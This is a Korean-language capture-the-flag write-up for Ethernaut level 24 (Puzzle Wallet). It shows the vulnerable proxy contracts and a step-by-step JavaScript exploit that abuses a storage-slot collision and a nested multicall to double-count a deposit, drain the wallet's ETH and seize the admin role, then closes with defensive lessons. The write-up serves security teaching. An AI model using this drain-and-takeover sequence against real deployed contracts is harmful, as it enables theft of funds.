# Ethernaut Level 24 - Puzzle Wallet

## 문제 설명

Proxy 패턴의 스토리지 슬롯 충돌을 이용해 `admin`을 탈취하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;  // slot 0
    address public admin;         // slot 1

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }
}

contract PuzzleWallet {
    address public owner;         // slot 0  ← pendingAdmin과 충돌!
    uint256 public maxBalance;    // slot 1  ← admin과 충돌!
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly { selector := mload(add(_data, 32)) }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success);
        }
    }
}
```

---

## 취약점 분석

### 스토리지 슬롯 충돌

```
slot 0: PuzzleProxy.pendingAdmin == PuzzleWallet.owner
slot 1: PuzzleProxy.admin       == PuzzleWallet.maxBalance
```

`maxBalance`를 내 주소로 설정 → `admin`이 내 주소로 변경

### 공격 흐름

```
1. proposeNewAdmin(player) → pendingAdmin = player → owner = player
2. addToWhitelist(player)  → 화이트리스트 등록
3. multicall 중첩으로 잔액 이중 기록 → ETH 전부 출금
4. setMaxBalance(player주소) → maxBalance = player → admin = player
```

---

## 공격 단계

### Step 1 — owner 탈취

```js
await contract.proposeNewAdmin(player)
// slot 0 덮어쓰기 → PuzzleWallet.owner = player
```

### Step 2 — 화이트리스트 등록

```js
await contract.addToWhitelist(player)
```

### Step 3 — multicall로 잔액 이중 기록

```js
let depositData = contract.interface.encodeFunctionData("deposit")
let multicallData = contract.interface.encodeFunctionData(
    "multicall", [[depositData]]
)
let ethAmount = await getBalance(contract.address)

// multicall([deposit, multicall([deposit])]) → deposit이 두 번 기록됨
await contract.multicall(
    [depositData, multicallData],
    { value: ethAmount }
)
```

### Step 4 — 전체 ETH 출금

```js
await contract.execute(player, ethAmount * 2, "0x")
```

### Step 5 — admin 탈취

```js
// player 주소를 uint256으로 변환
await contract.setMaxBalance(BigInt(player))
// slot 1 → maxBalance = player → admin = player
```

### Step 6 — 확인

```js
await contract.admin()
// → 내 지갑 주소
```

---

## 핵심 교훈

- Proxy 패턴에서 Proxy와 Logic 컨트랙트의 **스토리지 레이아웃이 반드시 일치**해야 함
- EIP-1967 표준 스토리지 슬롯 사용으로 충돌 방지
- `multicall` 구현 시 재진입 및 함수 중복 호출 검증 필요
